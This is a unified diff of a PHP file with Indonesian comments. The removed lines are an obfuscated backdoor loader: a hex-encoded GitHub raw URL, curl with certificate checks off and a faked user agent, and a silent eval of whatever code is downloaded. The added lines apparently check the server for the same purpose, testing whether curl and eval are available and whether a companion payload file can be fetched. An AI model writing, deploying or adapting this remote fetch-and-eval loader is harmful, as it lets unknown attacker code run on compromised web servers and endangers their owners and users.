@@ -1,32 +1,34 @@
 <?php
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
 
-error_reporting(0);
-set_time_limit(0); // Agar skrip tidak mati saat proses network yang lama
+echo "<h2>Pemeriksaan Server</h2>";
 
-function get_u() {
-    return pack("H*", "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6c756666796f706d2f6f706d2f726566732f68656164732f6d61696e2f322e747874");
+$functions = ['curl_init', 'file_get_contents', 'eval', 'allow_url_fopen'];
+echo "<table border='1' cellpadding='5'>";
+foreach ($functions as $f) {
+    $status = function_exists($f) || (ini_get($f) == '1' || strtolower(ini_get($f)) == 'on') ? "✅ Aktif" : "❌ Mati";
+    echo "<tr><td>$f</td><td>$status</td></tr>";
 }
+echo "</table>";
 
-$ch = curl_init(get_u());
-curl_setopt_array($ch, [
-    CURLOPT_RETURNTRANSFER => true,
-    CURLOPT_FOLLOWLOCATION => true,
-    CURLOPT_SSL_VERIFYPEER => false,
-    CURLOPT_SSL_VERIFYHOST => false,
-    CURLOPT_TIMEOUT        => 30, // Ditambah jadi 30 detik
-    CURLOPT_USERAGENT      => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36'
-]);
+echo "<h2>Tes Koneksi ke GitHub</h2>";
+$url = "https://raw.githubusercontent.com/luffyopm/opm/refs/heads/main/3.txt";
 
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_TIMEOUT, 10);
 $res = curl_exec($ch);
+$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+$error = curl_error($ch);
 curl_close($ch);
 
-if ($res) {
-    // Teknik paling bersih untuk menjalankan kode dengan tag PHP aktif
-    try {
-        eval('?>' . $res);
-    } catch (Throwable $e) {
-        // Diam jika terjadi error internal
-    }
+if ($http_code == 200) {
+    echo "✅ Berhasil! File ditemukan.<br>";
+    echo "<b>Isi File:</b> <pre>" . htmlspecialchars(substr($res, 0, 100)) . "...</pre>";
+} else {
+    echo "❌ Gagal Terhubung.<br>";
+    echo "HTTP Code: $http_code <br>";
+    echo "Error: $error";
 }
-
-?>
